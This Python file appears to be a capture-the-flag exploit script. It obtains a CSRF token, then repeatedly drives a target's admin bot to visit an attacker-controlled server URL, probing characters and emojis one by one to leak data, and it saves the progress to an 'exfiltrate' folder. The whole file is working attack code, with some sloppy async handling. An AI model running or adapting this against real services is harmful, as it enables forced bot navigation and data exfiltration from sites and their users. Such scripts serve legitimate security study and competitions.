import httpx
import asyncio
import json
from datetime import datetime
import string
from context import CONTEXT as context
import logging
from time import sleep

hit_count = 0
log_per_hit_count = 3

async def checker(char, emoji):
    sleep(1)
    # LOGGING
    global hit_count
    global log_per_hit_count
    
    hit_count += 1
    if hit_count % log_per_hit_count == 0:
        now = datetime.now()
        with open(f"./exfiltrate/data-{now.strftime("%H_%M_%S")}.json", "w") as f:
            json.dump(context, f, indent=4)

async def exploit_target(session, my_server_url,target_base_url, char, emoji, multi=False):
    try:
        await session.get(context['target'])
        csrf_response = await session.get(f'{target_base_url}/csrf-token')

        if csrf_response.is_error:
            print(f"[ERR] Failed to get CSRF token for {char}{emoji}. Status: {csrf_response.status_code}")
            return False
        csrf_token = csrf_response.json()['csrfToken']

        target_url = ""
        
        if multi:
            target_url = my_server_url + f"/?char={char}&multi=1"
            print("[LOG] trying bot for:", f"/?char={char}&multi=1")
        else:
            print("[LOG] trying bot for:", f"/?char={char}&emoji={emoji}")
            target_url = my_server_url + f"/?char={char}&emoji={emoji}"
        
        data = {
            "action": "run",
            "url": target_url, 
            "timeout": 5000
        }
        headers = {
            "CSRF-Token": csrf_token,
            "Content-Type": "application/json"
        }
        
        start_bot_response = await session.post(
            f'{target_base_url}/start-bot', 
            json=data, 
            headers=headers
        )

        # Check if the bot start was successful
        if not start_bot_response.text == '{"message":"how did u get here?"}':
            print(f"[ERR] Failed to start bot for {emoji} - {char}. Status: {start_bot_response.status_code} \n[ERR] message: {start_bot_response.text}")
            checker(char, emoji)
        else:
            print(f"[!!!] Successfully triggered bot for {emoji} - {char}")
            sleep(1)
            return True

    except Exception as e:
        print(f"Exception occurred for {emoji} - {char} : {str(e)}")
            
        return False
        
async def main():
    try:
        global context

        emojis = ["^_^", ">_<", "owo", ":3", "uwu", "xD", "._.", "o_o", "T_T", "ಠ_ಠ", ":D", ":)", ":P", ";)", "-_-", ">:3", "♡", "｡^‿^｡", "(≧◡≦)", "ʕ•ᴥ•ʔ"]

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(30.0)
            ) as session:

            while True:
                results = []
                for emoji in emojis:
                    for char in context['survive'][emoji]:
                        result = await exploit_target(session, context['my_server'], context['target'], emoji=emoji, char=char)
                        results.append(result)


                # Count successes
                successful = sum(1 for result in results if result is True)
                print(f"\nAttack completed. Successful triggers: {successful}/{len(results)}")

    except Exception as e:
        print(e)
        now = datetime.now()
        with open(f"data-{now.strftime("%H_%M_%S")}.json", "w") as f:
            json.dump(context, f, indent=4)

async def main_all():
    try:
        global context

        emojis = ["^_^", ">_<", "owo", ":3", "uwu", "xD", "._.", "o_o", "T_T", "ಠ_ಠ", ":D", ":)", ":P", ";)", "-_-", ">:3", "♡", "｡^‿^｡", "(≧◡≦)", "ʕ•ᴥ•ʔ"]

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(30.0)
            ) as session:

            retries = 10
            while True:
                results = []
                allchar = list(string.ascii_letters + string.digits + "!$'()*+,-.:_")
                for char in allchar:
                    if char not in context['not_in_any_emojis']:
                        result = await exploit_target(session, context['my_server'], context['target'], char, "", multi=True)
                        results.append(result)

                # Count successes
                successful = sum(1 for result in results if result is True)
                print(f"\nAttack completed. Successful triggers: {successful}/{len(results)}")
    except Exception as e:
        print(e)
        now = datetime.now()
        with open(f"data-{now.strftime("%H_%M_%S")}.json", "w") as f:
            json.dump(context, f, indent=4)

if __name__ == "__main__":
    asyncio.run(main())